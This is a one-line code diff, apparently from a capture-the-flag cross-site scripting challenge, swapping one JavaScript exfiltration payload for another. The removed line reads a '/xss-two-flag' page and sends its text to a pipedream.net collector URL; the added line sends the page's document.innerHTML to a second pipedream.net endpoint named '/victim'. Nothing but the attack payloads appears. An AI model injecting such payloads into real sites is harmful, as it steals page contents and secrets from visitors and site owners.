@@ -1,1 +1,1 @@
-fetch('/xss-two-flag').then(response => response.text()).then(txt => fetch('https://eo95ue8auext5aq.m.pipedream.net/?flag=' + encodeURIComponent(txt)))
+fetch('https://eo1p5ngjucyv6en.m.pipedream.net/victim', {body: document.innerHTML})
